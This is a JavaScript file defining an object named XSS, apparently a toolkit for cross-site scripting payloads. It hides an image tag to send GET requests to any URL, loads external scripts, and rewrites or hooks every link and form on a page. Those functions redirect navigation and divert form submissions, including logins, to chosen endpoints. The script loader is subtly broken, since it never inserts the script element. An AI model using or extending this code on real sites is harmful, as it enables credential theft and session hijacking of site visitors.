var XSS = {
  imgTag: null,

  /*
   * Triggers a GET request to the given URL.
   *
   * @param {String} url
   *   The URL to request.
   *
   * @return {true}
   *   URL was successfully requested.
   */
  get: function(url) {
    var self = this;

    if (self.imgTag == null)
    {
      self.imgTag = document.createElement('img');
      self.imgTag.setAttribute('style', 'display: none;');
    }

    self.imgTag.setAttribute('src',url);
    return true;
  },

  /*
   * Loads JavaScript into the page.
   *
   * @param {String} url
   *   The URL to the JavaScript.
   */
  load: function(url) {
    var script = document.createElement('script');
    
    script.setAttribute('type','text/javascript');
    script.setAttribute('src',url);
  },

  /*
   * Rewrites the href attributes for all anchor links in the document.
   *
   * @param {function(href)} callback
   *   The callback to rewrite the hrefs of the links.
   *
   * @return {true}
   *   Links were successfully rewritten.
   */
  rewriteLinks: function(callback) {
    if (typeof callback !== "function") {
      throw "callback must be a function";
    }

    var links = document.getElementsByTagName('a');
    var length = links.length;

    for (var i = 0; i < length; i += 1) {
      var link = links[i];

      if (link.hasAttribute('href')) {
        link.setAttribute('href', callback(link.getAttribute('href')));
      }
    };

    return true;
  },

  /*
   * Hooks the click event for all anchor links in the document.
   *
   * @param {function} callback
   *   The click event callback.
   *
   * @return {true}
   *   Links were successfully hooked.
   */
  hookLinks: function(callback) {
    if (typeof callback !== "function") {
      throw "callback must be a function";
    }

    var links = document.getElementsByTagName('a');
    var length = links.length;

    for (var i = 0; i < length; i += 1) {
      var link = links[i];

      if (link.hasAttribute('href')) {
        link.onclick = callback;
      }
    };

    return true;
  },

  /*
   * Rewrites the action attributes for all forms in the document.
   *
   * @param {function(action)} callback
   *   The callback to rewrite the action URL of the forms.
   *
   * @return {true}
   *   Form actions were successfully rewritten.
   */
  rewriteForms: function(callback) {
    if (typeof callback !== "function") {
      throw "callback must be a function";
    }

    var forms = document.getElementsByTagName('form');
    var length = forms.length;

    for (var i = 0; i < length; i += 1) {
      var form = forms[i];

      if (form.hasAttribute('action')) {
        form.setAttribute('action', callback(form.getAttribute('action')));
      }
    };

    return true;
  },

  /*
   * Hooks the click event for all submit buttons in the document.
   *
   * @param {function} callback
   *   The click event callback.
   *
   * @return {true}
   *   Forms were successfully hooked.
   */
  hookForms: function(callback) {
    if (typeof callback !== "function") {
      throw "callback must be a function";
    }

    var inputs = document.getElementsByTagName('input');
    var length = inputs.length;

    for (var i = 0; i < length; i += 1) {
      var input = inputs[i];

      if (input.hasAttribute('type') && (input.getAttribute('type') === 'submit')) {
        input.onclick = callback;
      }
    };

    return true;
  }
};
